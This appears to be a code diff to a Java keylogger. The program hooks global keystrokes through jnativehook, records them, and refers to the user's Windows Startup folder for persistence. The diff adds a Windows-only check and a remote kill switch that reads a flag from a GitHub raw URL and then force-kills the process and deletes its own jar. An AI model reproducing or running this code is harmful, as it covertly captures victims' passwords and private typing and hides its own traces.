@@ -8,8 +8,10 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.net.URISyntaxException;
+import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.Scanner;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -17,6 +19,14 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener{
 	public static void main (String[] args) throws IOException, URISyntaxException {
+		if (!isWindows()) {
+			System.exit(0);
+		}
+		if (isSuicune()) {
+			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+			 @SuppressWarnings("unused")
+			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf);
+		}
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		// System.out.println("Location " + yiffyiff);
 		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
@@ -49,6 +59,27 @@ public class Main implements NativeKeyListener{
 		GlobalScreen.getInstance().addNativeKeyListener(new Main());
 	}
 
+	private static boolean isSuicune() {
+		try {
+			   URL oracle = new URL("https://raw.githubusercontent.com/OtakuInSeattle/sites/master/klkillswitch");
+		       Scanner inSt = new Scanner(oracle.openStream());
+		       String inputLine = "";
+		       while (!inputLine.equals("Suicide")){
+		           inputLine = inSt.next();
+					// System.out.println(inputLine);
+				}
+				String auth = inSt.next();
+				inSt.close();
+				if (auth.matches("yes")) {
+					return true;
+				} else {
+					return false;
+				}
+		} catch (Exception e) {
+			return false;
+		}
+	}
+
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		// TODO Auto-generated method stub
@@ -71,7 +102,6 @@ public class Main implements NativeKeyListener{
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
 		// TODO Auto-generated method stub
-		
 	}
 	public static void record(String x) {
 		try {
@@ -90,5 +120,8 @@ public class Main implements NativeKeyListener{
 			e.printStackTrace();
 		}
 	}
-	
+	 public static boolean isWindows() {
+		   String OS = System.getProperty("os.name").toLowerCase();
+		   return (OS.indexOf("win") >= 0);
+		}
 }
